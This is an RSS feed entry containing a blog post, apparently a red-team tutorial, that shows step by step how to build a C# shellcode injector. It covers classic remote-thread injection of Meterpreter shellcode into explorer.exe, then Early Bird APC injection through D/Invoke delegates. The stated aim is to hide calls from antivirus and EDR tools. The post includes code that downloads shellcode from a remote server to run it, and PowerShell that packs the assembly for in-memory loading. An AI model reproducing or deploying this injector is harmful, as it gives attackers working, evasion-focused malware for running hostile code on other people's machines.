<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Jake Mai</title><link>https://jakemai0.github.io/posts/</link><description>Recent content in Posts on Jake Mai</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&lt;a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0&lt;/a></copyright><lastBuildDate>Fri, 13 Jan 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://jakemai0.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Process Injection with D/Invoke - Part 1</title><link>https://jakemai0.github.io/posts/processinjection_0/</link><pubDate>Fri, 13 Jan 2023 00:00:00 +0000</pubDate><guid>https://jakemai0.github.io/posts/processinjection_0/</guid><description>Introduction In this blog post, I will be talking about writing your own injector in C#. Part 1 will mainly cover the use of D/Invoke and Early Bird process injection technique. In future posts, let&amp;rsquo;s improve our malware with PPID (Parent Process ID) Spoofing, protect our malware from EDRs with blockdlls, ACG (Arbitrary Code Guard), invoking system calls instead of API call, and more.
I won&amp;rsquo;t be drilling deep into each and everything mentioned, but some basic knowledge in programming, Windows internals and Windows API should help you understanding the content much better.</description><content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>In this blog post, I will be talking about writing your own injector in C#. Part 1 will mainly cover the use of D/Invoke and Early Bird process injection technique. In future posts, let&rsquo;s improve our malware with PPID (Parent Process ID) Spoofing, protect our malware from EDRs with blockdlls, ACG (Arbitrary Code Guard), invoking system calls instead of API call, and more.</p>
<p>I won&rsquo;t be drilling deep into each and everything mentioned, but some basic knowledge in programming, Windows internals and Windows API should help you understanding the content much better.</p>
<h2 id="pinvoke">P/Invoke</h2>
<p>On a high level, <a href="https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke">P/Invoke</a> - Platform Invoke is a .NET mechanism, or technology that allows .NET applications to make calls and access the Windows APIs (via the <code>System</code> and <code>System.Runtime.InteropServices</code> namespaces). Combining with the ability to load and execute .NET assemblies (exe, dll) from memory thanks to the magic of Reflection, this is great for Red Teamers/TAs to carry out post-exploitation tradecrafts without touching the disk. Here is an example of P/Invoke usage to call the <code>OpenProcess</code> Win32API:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>Define<span style="color:#960050;background-color:#1e0010">&#39;</span> the OpenProcess API <span style="color:#66d9ef">from</span> kernel32.dll
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">[DllImport(&#34;kernel32.dll&#34;, SetLastError = true, ExactSpelling = true)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr OpenProcess(
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">uint</span> processAccess,
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">bool</span> bInheritHandle,
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> processID);
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> Open a handle to <span style="color:#960050;background-color:#1e0010">&#39;</span>explorer.exe<span style="color:#960050;background-color:#1e0010">&#39;</span> with OpenProcess.
</span></span><span style="display:flex;"><span>IntPtr hProcess = OpenProcess(<span style="color:#ae81ff">0x001F0FFF</span>, <span style="color:#66d9ef">false</span>, Process.GetProcessesByName(<span style="color:#e6db74">&#34;explorer&#34;</span>)[<span style="color:#ae81ff">0</span>].Id);
</span></span></code></pre></div><p>Okay neat, we can import and call any API we want, so what&rsquo;s the downside?</p>
<ol>
<li>Any API import via P/Invoke is a static reference and will be visible in the assembly&rsquo;s Import Address Table (IAT). This is bad OPSEC since the IAT entries will be populated at run time, with all the references to the APIs we&rsquo;re about to call. Suspicious API calls considered by AV/EDR to be usual suspects such as: <code>VirtualAlloc</code>, <code>VirtualAllocEx</code>, <code>MoveMemory</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThread</code> will be caught immediately. It&rsquo;s like going through airport security with bag full of explosives, you want to get caught at this point.</li>
<li>API hooking (specific API calls monitored by AV/EDR) also busts suspicious API calls, we would need to avoid the usage of the more &ldquo;obvious&rdquo; APIs. D/Invoke provides Manual Mapping as a solution to bypass API hooking, but it won&rsquo;t be covered in this post.</li>
</ol>
<h2 id="dinvoke">D/Invoke</h2>
<p><a href="https://github.com/TheWover/DInvoke">D/Invoke</a> - Dynamic Invoke was introduced in 2020 as a replacement for P/Invoke. Basically, D/Invoke grants .NET assemblies to dynamically invoking unmanaged APIs:</p>
<ul>
<li>Load a DLL into memory</li>
<li>Get a pointer to a function/API in that DLL</li>
<li>Call desired API using the pointer while passing in parameters
This is the standard usage of D/Invoke and will avoid directly importing the APIs into our .NET Assembly&rsquo;s IAT.</li>
</ul>
<p>To do this, D/Invoke works with <a href="https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/delegates/">Delegates</a>. I&rsquo;m probably not the best at explaining Delegates since this is my first time doing development in C#, but in my understanding, <code>Delegates</code> allows wrapping functions within a class, API calls can now be declared as a class and be used later on. Here is an example of D/Invoke usage to call the <code>VirtualAllocEx</code> Win32API:</p>
<p>Creating Delegate for <code>VirtualAllocEx</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DELEGATES</span> {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, <span style="color:#66d9ef">uint</span> dwSize, <span style="color:#66d9ef">uint</span> flAllocationType, <span style="color:#66d9ef">uint</span> flProtect);
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>Call this Delegate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span>pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;VirtualAllocEx&#34;</span>);
</span></span><span style="display:flex;"><span>DELEGATES.VirtualAllocEx virAllocEx = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.VirtualAllocEx)) <span style="color:#66d9ef">as</span> DELEGATES.VirtualAllocEx;
</span></span><span style="display:flex;"><span>IntPtr allocret = virAllocEx(procInfo.hProcess, IntPtr.Zero, (<span style="color:#66d9ef">uint</span>)sheocode.Length, <span style="color:#ae81ff">0x1000</span> | <span style="color:#ae81ff">0x2000</span>, <span style="color:#ae81ff">0x40</span>); <span style="color:#75715e">//MEM_COMMIT | MEM_RESERVE</span>
</span></span></code></pre></div><ol>
<li>Get the pointer to <code>VirtualAllocEx</code> in <code>kernel32.dll</code> via the helper function <code>GetLibraryAddress</code>.</li>
<li>Use <code>GetDelegateForFunctionPointer</code> to convert the function pointer into a delegate and cast it with the same delegate type.</li>
<li>Call the API/Instantiate the delegate.</li>
</ol>
<p><em>In this blog post series, I won&rsquo;t be importing the whole D/Invoke project, but only take the neccessary helper functions, structs and enums</em></p>
<h2 id="project-injection-101">Project Injection 101</h2>
<p>Project Injection is a commonly used technique to inject our shellcode into legitimate target process&rsquo;s virtual memory space. A textbook way to perform project injection is:</p>
<ol>
<li>Find a target process to inject our shellcode into.</li>
<li>Allocate a new memory region in the remote target process using <code>VirtualAllocEx</code></li>
<li>Write our shellcode into the allocated remote memory region using <code>WriteProcessMemory</code></li>
<li>Execute our shellcode as a new thread with <code>CreateRemoteThread</code></li>
</ol>
<p>Here is a PoC to inject shellcode into <code>explorer.exe</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#75715e">// Get pid of explorer.exe</span>
</span></span><span style="display:flex;"><span>Process[] explorerProcess = Process.GetProcessesByName(<span style="color:#e6db74">&#34;explorer&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Open a handle to explorer.exe</span>
</span></span><span style="display:flex;"><span>IntPtr hProcess = OpenProcess(<span style="color:#ae81ff">0x001F0FFF</span>, <span style="color:#66d9ef">false</span>, explorerProcess[<span style="color:#ae81ff">0</span>].Id);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Allocate remote mem</span>
</span></span><span style="display:flex;"><span>IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x3000</span>, <span style="color:#ae81ff">0x40</span>);
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 0x3000 = MEM_COMMIT | MEM_RESERVE (0x1000 | 0x2000)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 0x40: PAGE_EXECUTE_READWRITE (RWX)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// shellcode</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">byte</span>[] buf = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">511</span>] {<span style="color:#ae81ff">0xfc</span>,<span style="color:#ae81ff">0x48</span>,...,<span style="color:#ae81ff">0xd5</span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>IntPtr outSize;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Write shellcode to allocated buffer</span>
</span></span><span style="display:flex;"><span>WriteProcessMemory(hProcess, addr, buf, buf.Length, <span style="color:#66d9ef">out</span> outSize);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Execute thread</span>
</span></span><span style="display:flex;"><span>IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, <span style="color:#ae81ff">0</span>, addr, IntPtr.Zero, <span style="color:#ae81ff">0</span>, IntPtr.Zero);
</span></span></code></pre></div><p>This injection method works, however, it has a lot of flaws and can be easily picked up. The most obvious red flag  is the <code>PAGE_EXECUTE_READWRITE (RWX)</code> with <code>VirtualAllocEx</code>, as most memory region in the process has <strong>RX</strong> protection, allocating memory for our shellcode with Read, Write and Execute (RWX) will make it more than obvious to AV/EDR.

    <img src="/images/explorer_11888.png"  alt="Meterpreter shellcode injected into explorer.exe"  class="center"  style="border-radius: 8px;"  />


<em>Meterpreter shellcode was injected successfully into explorer.exe</em></p>
<p>
    <img src="/images/explorer_bad_injection.png"  alt="RWX region stood out"  class="center"  style="border-radius: 8px;"  />


<em>RWX region containing the shellcode stood out</em></p>
<p>This injection could also be detected by this <a href="https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2">Get-InjectedThread</a> script:

    <img src="/images/injection_caught.png"  alt="Injection detected"  class="center"  style="border-radius: 8px;"  />


<em>Injection detected</em></p>
<p>Additionally, <code>CreateRemoteThread</code> API is heavily scrutinized by AV/EDR as this commonly seen in injection techniques to create a thread that runs in a remote process&rsquo;s virtual memory space.</p>
<h2 id="early-bird-process-injection-with-dinvoke">Early Bird Process Injection with D/Invoke</h2>
<p>Let&rsquo;s improve our injection method with a technique called Early Bird (circa 2018), a variant of APC Queue Injection.
On a high level:</p>
<ol>
<li>Spawn a new process to inject into and put it in suspended state using <code>CreateProcess</code></li>
<li>Allocate memory buffer in the target process with <code>RW</code> flag using <code>VirtualAllocEx</code></li>
<li>Write shellcode in the target buffer using <code>WriteProcessMemory</code></li>
<li>Change the target memory region to <code>RX</code> in order for our shellcode to execute using <code>VirtualProtectEx</code></li>
<li>Queue a thread, pointing the APC object to the shellcode in the target buffer</li>
<li>Resume thread to start the shellcode execution</li>
</ol>
<p>Let&rsquo;s implement this injection using D/Invoke.
First of all, as mentioned above, I won&rsquo;t be importing the whole D/Invoke project but only taking neccessary functions, structs and enums from <a href="https://github.com/TheWover/DInvoke/blob/dev/DInvoke/DInvoke/DynamicInvoke">D/Invoke GitHub</a>.
At the time of writing, the list of functions from D/Invoke source code that I have are:</p>
<ul>
<li><code>DynamicAPIInvoke</code>: Invoke an arbitrary function from a DLL dynamically, providing its name, function prototype, and arguments.</li>
<li><code>DynamicFunctionInvoke</code>: Invoke an arbitrary function from a pointer, called by <code>DynamicAPIInvoke</code>.</li>
<li><code>GetLibraryAddress</code>: Helper for getting the pointer to a function from a DLL loaded by the process.</li>
<li><code>GetLoadedModuleAddress</code>: Helper for getting the base address of a module loaded by the current process.</li>
<li><code>LoadModuleFromDisk</code>: Resolve <code>LdrLoadDll</code> and uses that function to load a DLL from disk.</li>
<li><code>GetExportAddress</code>: Resolves the address of a function by manually walking the module export table, given a module base address.
We also need to define <code>RtlInitUnicodeString</code> and <code>LdrLoadDll</code> from <code>ntdll.dll</code>, also referenced on <a href="https://github.com/TheWover/DInvoke/blob/dev/DInvoke/DInvoke/DynamicInvoke/Native.cs">D/Invoke GitHub</a> (LdrLoadDll is an undocumented ntdll native API)</li>
</ul>
<p>Structs and Enums:</p>
<ul>
<li><code>NTSTATUS</code>: <a href="https://dinvoke.net/en/ntdll/NTSTATUS">Undocumented Enum</a></li>
<li><code>UNICODE_STRING</code>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-unicode_string">Documented Struct</a></li>
<li><code>PROCESS_INFORMATION</code>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information">Documented Struct</a></li>
<li><code>STARTUPINFO</code>: <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa">Documented Struct</a></li>
<li><code>ProcessCreationFlags</code>: <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags">Documented Enum</a></li>
</ul>
<p>Once all this Ctrl+C and Ctrl+V is done, we can start creating Delegates for the APIs, following the documentations for these APIs from Microsoft.</p>
<p>Creating delegate for <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcess</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DELEGATES</span> {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">		[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">bool</span> CreateProcess(<span style="color:#66d9ef">string</span> lpApplicationName, <span style="color:#66d9ef">string</span> lpCommandLine, IntPtr lpProcessAttributes,
</span></span><span style="display:flex;"><span>		IntPtr lpThreadAttributes, <span style="color:#66d9ef">bool</span> bInheritHandles, STRUCTS.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">string</span> lpCurrentDirectory, <span style="color:#66d9ef">ref</span> STRUCTS.STARTUPINFO lpStartupInfo, <span style="color:#66d9ef">out</span> STRUCTS.PROCESS_INFORMATION lpProcessInformation);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//......</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Creating delegate for <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, <span style="color:#66d9ef">uint</span> dwSize, <span style="color:#66d9ef">uint</span> flAllocationType, <span style="color:#66d9ef">uint</span> flProtect);
</span></span></code></pre></div><p>Creating delegate for <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">bool</span> WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, <span style="color:#66d9ef">byte</span>[] lpBuffer, <span style="color:#66d9ef">uint</span> nSize, <span style="color:#66d9ef">out</span> UIntPtr lpNumberOfBytesWritten);
</span></span></code></pre></div><p>Creating delegate for <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex">VirtualProtectEx</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">bool</span> VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, <span style="color:#66d9ef">int</span> dwSize, <span style="color:#66d9ef">uint</span> flNewProtect, <span style="color:#66d9ef">out</span> <span style="color:#66d9ef">uint</span> lpflOldProtect);
</span></span></code></pre></div><p>Creating delegate for <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex">QueueUserAPC</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
</span></span></code></pre></div><p>Creating delegate for <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread">ResumeThread</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">uint</span> ResumeThread(IntPtr hThhread);
</span></span></code></pre></div><p>Creating delegate for <code>LdrLoadDll</code> (This is an undocumented native API, go to <a href="http://undocumented.ntinternals.net/">http://undocumented.ntinternals.net/</a> and search for LdrLoadDll)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, <span style="color:#66d9ef">ref</span> STRUCTS.UNICODE_STRING ModuleFileName, <span style="color:#66d9ef">ref</span> IntPtr ModuleHandle);
</span></span></code></pre></div><p>Creating delegate for <a href="https://www.pinvoke.net/default.aspx/ntdll/RtlInitUnicodeString.html">RtlInitUnicodeString</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#a6e22e">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">delegate</span> <span style="color:#66d9ef">void</span> RtlInitUnicodeString(<span style="color:#66d9ef">ref</span> STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] <span style="color:#66d9ef">string</span> SourceString);
</span></span></code></pre></div><p>We can now start invoking the APIs through the delegates in our Main() function.
We can either store our (encrypted)shellcode on within the assembly or download it from a remote server.
To download the shellcode from a remote server, we need the <code>System.Net.Http</code> namespace, and create a <code>HttpClient</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#66d9ef">byte</span>[] shellcode;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> recv = <span style="color:#66d9ef">new</span> HttpClient()) {
</span></span><span style="display:flex;"><span>  shellcode = recv.GetByteArrayAsync(<span style="color:#e6db74">&#34;https://x.x.x.x/shellcode.bin&#34;</span>).GetAwaiter().GetResult();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>startInfo</code> and <code>procInfo</code> store process information such as process handle and thread handle:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span>STRUCTS.STARTUPINFO startInfo = <span style="color:#66d9ef">new</span> STRUCTS.STARTUPINFO();
</span></span><span style="display:flex;"><span>STRUCTS.PROCESS_INFORMATION procInfo = <span style="color:#66d9ef">new</span> STRUCTS.PROCESS_INFORMATION();
</span></span></code></pre></div><p>Invoke Create Process through its delegate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span>IntPtr pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;CreateProcessA&#34;</span>);
</span></span><span style="display:flex;"><span>DELEGATES.CreateProcess createProc = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.CreateProcess)) <span style="color:#66d9ef">as</span> DELEGATES.CreateProcess;
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Spawn new process in suspended state</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> yayornay = createProc(<span style="color:#e6db74">&#34;process_path_here&#34;</span>, <span style="color:#66d9ef">null</span>, IntPtr.Zero, IntPtr.Zero, <span style="color:#66d9ef">false</span>, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED,
</span></span><span style="display:flex;"><span>IntPtr.Zero, <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">ref</span> startInfo, <span style="color:#66d9ef">out</span> procInfo);
</span></span></code></pre></div><p>Invoke VirtualAllocEx through its delegate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span>pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;VirtualAllocEx&#34;</span>);
</span></span><span style="display:flex;"><span>DELEGATES.VirtualAllocEx virAllEx = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.VirtualAllocEx)) <span style="color:#66d9ef">as</span> DELEGATES.VirtualAllocEx;
</span></span><span style="display:flex;"><span>IntPtr allocret = virAllEx(procInfo.hProcess, IntPtr.Zero, (<span style="color:#66d9ef">uint</span>)sheocode.Length, <span style="color:#ae81ff">0x1000</span> | <span style="color:#ae81ff">0x2000</span>, <span style="color:#ae81ff">0x04</span>); <span style="color:#75715e">//MEM_COMMIT | MEM_RESERVE; 0x04: RW</span>
</span></span></code></pre></div><p>Invoke WriteProcessMemory through its delegate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span>pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;WriteProcessMemory&#34;</span>);
</span></span><span style="display:flex;"><span>DELEGATES.WriteProcessMemory writeProcMem = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.WriteProcessMemory)) <span style="color:#66d9ef">as</span> DELEGATES.WriteProcessMemory;
</span></span><span style="display:flex;"><span>writeProcMem(procInfo.hProcess, allocret, sheocode, (<span style="color:#66d9ef">uint</span>)sheocode.Length, <span style="color:#66d9ef">out</span> UIntPtr bytesWritten);
</span></span></code></pre></div><p>Invoke VirtualProtectEx through its delegate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span>pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;VirtualProtectEx&#34;</span>);
</span></span><span style="display:flex;"><span>DELEGATES.VirtualProtectEx virProtEx = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.VirtualProtectEx)) <span style="color:#66d9ef">as</span> DELEGATES.VirtualProtectEx;
</span></span><span style="display:flex;"><span>virProtEx(procInfo.hProcess, allocret, sheocode.Length, <span style="color:#ae81ff">0x20</span>, <span style="color:#66d9ef">out</span> oldProtect); <span style="color:#75715e">// 0x20: RX</span>
</span></span></code></pre></div><p>Invoke QueueUserAPC through its delegate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span>pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;QueueUserAPC&#34;</span>);
</span></span><span style="display:flex;"><span>DELEGATES.QueueUserAPC qUsrAPC = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.QueueUserAPC)) <span style="color:#66d9ef">as</span> DELEGATES.QueueUserAPC;
</span></span><span style="display:flex;"><span>qUsrAPC(allocret, procInfo.hThread, IntPtr.Zero);
</span></span></code></pre></div><p>Invoke ResumeThread through its delegate:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span>pntr = DInvokeFunctions.GetLibraryAddress(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>, <span style="color:#e6db74">&#34;ResumeThread&#34;</span>);
</span></span><span style="display:flex;"><span>DELEGATES.ResumeThread resThrd = Marshal.GetDelegateForFunctionPointer(pntr, <span style="color:#66d9ef">typeof</span>(DELEGATES.ResumeThread)) <span style="color:#66d9ef">as</span> DELEGATES.ResumeThread;
</span></span><span style="display:flex;"><span>resThrd(procInfo.hThread);
</span></span></code></pre></div><p>Build our .NET assembly as a x64 executable.
For the sake of the demo, we can cheat a bit. In order to load our assembly in the target&rsquo;s memory, let&rsquo;s gzip compress and then base64 encode the assembly&rsquo;s byte stream, output it to <code>compressedEncodedBytes.txt</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Powershell" data-lang="Powershell"><span style="display:flex;"><span>$bytes = [<span style="color:#66d9ef">System.IO.File</span>]::ReadAllBytes(<span style="color:#e6db74">&#34;</span>$(pwd)<span style="color:#e6db74">\injection.exe&#34;</span>)
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">System.IO.MemoryStream</span>] $outStream = New-Object System.IO.MemoryStream
</span></span><span style="display:flex;"><span>$gzipStream = New-Object System.IO.Compression.GzipStream($outStream, [<span style="color:#66d9ef">System.IO.Compression.CompressionMode</span>]::Compress)
</span></span><span style="display:flex;"><span>$gzipStream.Write($bytes, <span style="color:#ae81ff">0</span>, $bytes.Length)
</span></span><span style="display:flex;"><span>$gzipStream.Close()
</span></span><span style="display:flex;"><span>$outStream.Close()
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">byte[]</span>] $outBytes = $outStream.ToArray()
